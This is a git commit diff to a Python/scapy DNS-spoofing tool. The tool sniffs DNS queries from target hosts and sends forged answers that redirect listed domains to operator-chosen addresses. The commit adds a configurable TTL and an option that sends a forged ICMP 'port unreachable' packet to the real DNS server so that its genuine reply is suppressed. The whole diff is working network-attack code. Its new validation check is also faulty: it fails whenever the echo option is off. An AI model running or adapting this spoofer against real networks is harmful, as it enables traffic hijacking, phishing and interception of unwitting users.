72b9b18a524e752374cd4ef32c9b1741eef9f5ff
dsal3389 <dsal3389@gmail.com>
2020-09-09 16:16:50 +0300

    added echo type 3 option

--- dumbnsspoof/dumbnsspoof.py
+++ dumbnsspoof/dumbnsspoof.py
@@ -9,39 +9,54 @@ logger = logging.getLogger(__file__)
 
 
 class DnsSpoofer:
-    def __init__(self, targets, domains, interface):
+    def __init__(self, targets, domains, interface, echo3, ttl, dns_mac):
         self.targets = targets
         self.domains = domains
         self.interface = interface
+        self.echo3 = echo3
+        self.ttl   = ttl
+        self.dns_mac = dns_mac
 
     def get_filter(self):
-        filter = ''
+        filter = 'dst port 53'
 
         if self.targets:
+            filter += ' and '
+
             for i, target in enumerate(self.targets):
                 filter += f'src host {target}'
                 
                 if i < (len(self.targets) - 1):
                     filter += ' or '
-            filter += ' and '
-        filter += 'dst port 53'
+        
+        if self.dns_mac:
+            filter += f' and not ether dst host {self.dns_mac}'
         return filter
 
     def send_query(self, dst, pkt):
+        if self.echo3:
+            echo_pkt = (
+                        Ether(dst=self.dns_mac, src=pkt[Ether].dst)/
+                        IP(dst=pkt[IP].dst, src=pkt[IP].src)/
+                        UDP(dport=pkt[UDP].dport, sport=pkt[UDP].sport)/
+                        ICMP(type=3, code=3)
+                    )
+            sendp(echo_pkt, iface=self.interface, verbose=0)
+            logging.debug('sending echo error code 3')
+
         pkt_rr_type = 1 if ipaddress.ip_address(dst).version == 4 else 28
         rpkt = (
                 Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)/
                 IP(dst=pkt[IP].src, src=pkt[IP].dst)/
                 UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/
-                DNS(id=pkt[DNS].id, qr=1, ancount=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dst, type=pkt_rr_type, ttl=3000))
+                DNS(id=pkt[DNS].id, qr=1, ancount=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dst, type=pkt_rr_type, ttl=self.ttl))
             )
         sendp(rpkt, iface=self.interface, verbose=0)
         logging.info('spoofed DNS packet sended to %s (redirected to %s)' %(pkt[IP].src, dst))
 
     def packet_handler(self, pkt):
         requested_domain = str(pkt.qd.qname, encoding='utf-8')
-       
-        print('requested', requested_domain)
+
         for dst, domains in self.domains.items():
             for domain in domains:
 
@@ -52,7 +67,9 @@ class DnsSpoofer:
     def start(self):
         filter_string = self.get_filter()
 
+        logger.debug('using filter %s' %filter_string)
         logger.info('dns service spoofing started (port: 53)')
+
         sniff(prn=self.packet_handler, filter=filter_string, store=0, iface=self.interface)
 
 
@@ -73,6 +90,13 @@ def main(namespace):
     config.setdefault('targets', [])
     config.setdefault('domains', {})
     config.setdefault('interface', namespace.interface)
+    config.setdefault('echo3', namespace.echo3)
+    config.setdefault('ttl', namespace.ttl)
+    config.setdefault('dns_mac', namespace.dns_mac)
+
+    if not (config['echo3'] and config['dns_mac']):
+        raise ValueError('when using echo3 a dns-mac is required as well')
+
     logger.debug('config: ' + json.dumps(config, indent=4))
 
     dns_spoofer = DnsSpoofer(**config)
@@ -83,5 +107,11 @@ if __name__ == "__main__":
     parser.add_argument('--config', type=str, default='dumbns.config.json', help='config file name')
     parser.add_argument('-i', '--interface', type=str, help='interface to listen to (check ur interface with "ip links")')
     parser.add_argument('--logging-level', type=int, default=logging.INFO, help='set logging level (python numeric value https://docs.python.org/3/library/logging.html#logging-levels)')
+    parser.add_argument('-e3', '--echo3', type=bool, nargs='?', const=True, default=False, help="when a domain is match, send ICMP type3 code 3 to the real dns")
+    parser.add_argument('--ttl', type=int, default=1500, help='set a ttl on the returned DNS response, for how much time the DNS response is valid')
+    parser.add_argument('--dns-mac', type=str, help='when using -e3 the packet need to be send to the real dns server')
+    
+    if os.getuid():
+        raise IOError('script requires root access')
 
     main(parser.parse_args(sys.argv[1:]))
